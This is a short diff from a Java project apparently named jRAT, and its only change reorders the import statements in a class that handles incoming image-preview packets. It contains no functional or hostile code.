@@ -3,9 +3,9 @@ package jrat.client.packets.incoming;
 import jrat.client.Connection;
 import jrat.client.packets.outgoing.Packet43PreviewImage;
 
+import javax.imageio.ImageIO;
 import java.awt.image.BufferedImage;
 import java.io.File;
-import javax.imageio.ImageIO;
 
 public class Packet62PreviewImage extends AbstractIncomingPacket {
 
